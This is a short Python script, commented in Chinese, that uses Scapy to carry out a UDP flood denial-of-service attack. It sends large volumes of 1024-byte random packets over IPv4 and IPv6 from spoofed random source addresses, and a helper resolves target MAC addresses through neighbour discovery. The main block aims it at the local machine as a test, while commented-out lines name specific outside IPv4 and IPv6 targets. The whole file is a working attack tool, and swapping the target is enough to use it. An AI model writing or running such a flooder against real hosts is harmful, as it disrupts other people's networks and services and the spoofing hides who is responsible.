# 模拟UDP Flood攻击, 发送大量UDP报文
# 21、30行指定了是发给Windows环境中的WLAN网口
# 49-52行设置发送给本机，端口2024，数量为200

from scapy.layers.inet import IP, UDP
from scapy.all import send, RandIP, Raw, RandString, RandIP6
from scapy.layers.l2 import Ether
from scapy.layers.inet6 import IPv6, ICMPv6ND_NS
from scapy.sendrecv import srp

from scapy.all import conf
from scapy.arch import get_if_addr, get_if_addr6


# 伪造源IP进行udp flood攻击
def udp_flood(target_ip, target_port, num_packets):
    # 构造UDP数据包
    packet = IP(src=RandIP(), dst=target_ip) / UDP(dport=target_port) / Raw(RandString(size=1024))

    # 发送数据包
    send(packet, count=num_packets, verbose=False, iface="WLAN")


def udp_flood_ipv6(target_ipv6, target_mac, target_port, num_packets):
    # 构造IPv6 UDP数据包
    packet = IPv6(src=RandIP6(), dst=target_ipv6) / UDP(dport=target_port) / Raw(RandString(size=1024))

    packet.dst = target_mac
    # 发送数据包
    send(packet, count=num_packets, verbose=False, iface="WLAN")

# 获取对应IPv6的mac地址,这通常发生在本地网络中，
# 因为IPv6地址通常不直接映射到MAC地址，而是通过邻居发现协议（NDP）来解析
def get_mac_address(target_ipv6):
    # 构造IPv6 NDP请求
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / IPv6(dst=target_ipv6) / ICMPv6ND_NS(tgt=target_ipv6)

    # 发送NDP请求并获取响应
    response, _ = srp(packet, timeout=2, verbose=False)

    # 提取响应中的MAC地址
    for _, rcv in response:
        return rcv[Ether].src

if __name__ == "__main__":
    # target_ip = "10.12.169.164"
    # target_ipv6 = "2001:250:4000:5113:6000:ec63:3d8c:1cdf"
    # 自动获取本地IPv4和IPv6地址, 测试阶段发给自己
    target_ip = get_if_addr(conf.iface)
    target_ipv6 = get_if_addr6(conf.iface)
    target_port = 2024
    num_packets = 200

    mac_address = get_mac_address(target_ipv6)
    udp_flood(target_ip, target_port, num_packets)
    udp_flood_ipv6(target_ipv6, mac_address, target_port, num_packets)
